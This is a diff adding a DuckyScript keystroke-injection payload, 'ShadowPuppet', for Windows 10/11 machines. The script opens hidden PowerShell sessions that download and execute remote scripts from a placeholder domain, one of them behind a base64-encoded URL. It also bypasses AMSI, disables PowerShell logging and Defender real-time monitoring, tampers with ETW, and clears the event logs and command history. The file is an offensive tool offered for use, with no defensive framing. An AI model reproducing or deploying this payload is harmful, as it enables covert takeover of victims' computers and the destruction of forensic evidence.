@@ -1,0 +1,69 @@
+REM Author: anonymized
+REM Title: ShadowPuppet – Conditional LAN Streamer
+REM Category: remote-access
+REM Target: Windows 10/11 physical only
+REM Encoder: PayloadStudio (DuckyScript 3.0)
+
+ATTACKMODE HID
+LED_OFF
+DELAY 500
+
+REM ─── CONFIG ───────────────────────────────────────
+DEFINE EXECUTE_PAYLOAD TRUE
+DEFINE REMOTE_PS_URL https://yourdomain.com/streamer/stream.ps1
+DEFINE SECONDARY_B64 aHR0cHM6Ly95b3VyZG9tYWluLmNvbS9wYXlsb2Fkcy9zZWNvbmQucHMx
+DEFINE LISTEN_PORT 9000
+
+REM ─── CONDITIONAL INJECTION ────────────────────────
+IF ( EXECUTE_PAYLOAD == TRUE ) THEN
+  LED_R
+  DELAY 300
+
+  REM Launch primary hidden PowerShell streamer with correct variable injection
+  GUI r
+  DELAY 400
+  STRING powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$lp="
+  STRING LISTEN_PORT
+  STRING ";$url='"
+  STRING REMOTE_PS_URL
+  STRING "';iex (iwr $url).Content"
+  ENTER
+  DELAY 2000
+  CTRL-SHIFT ENTER
+  DELAY 1000
+  ALT y
+  DELAY 500
+
+  REM Secondary stealth PowerShell session for evasions
+  GUI r
+  DELAY 300
+  STRINGLN powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass
+  DELAY 300
+
+  STRINGLN $a='AmsiUtils';$f='amsiInitFailed';[Ref].Assembly.GetType("System.Management.Automation.$a").GetField($f,'NonPublic,Static').SetValue($null,$true)
+  DELAY 100
+
+  STRINGLN $p='HKLM:\Software\Policies\Microsoft\Windows\PowerShell';New-Item -Path $p -Force|Out-Null;New-ItemProperty -Path "$p\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 0 -PropertyType DWORD -Force|Out-Null;New-ItemProperty -Path "$p\ModuleLogging" -Name EnableModuleLogging -Value 0 -PropertyType DWORD -Force|Out-Null
+  DELAY 100
+
+  STRINGLN Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class MSFT_MpPreference | % { $_.DisableRealtimeMonitoring=$true; $_.Put() } | Out-Null
+  DELAY 100
+
+  STRINGLN [System.Diagnostics.Eventing.EventProvider]::new([Guid]'{e13c0d23-ccbc-4e12-931b-d9cc2eee27e4}').Dispose()
+  DELAY 100
+
+  REM Decode & run secondary payload
+  STRINGLN $b64="SECONDARY_B64"
+  DELAY 100
+  STRINGLN $decoded=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64));iex (iwr $decoded).Content
+  DELAY 200
+
+  REM Cleanup logs & history
+  STRINGLN 'Security','System','Application','Windows PowerShell' | % { wevtutil clear-log $_ }
+  DELAY 100
+  STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+  LED_G
+END_IF
+
+LED_OFF
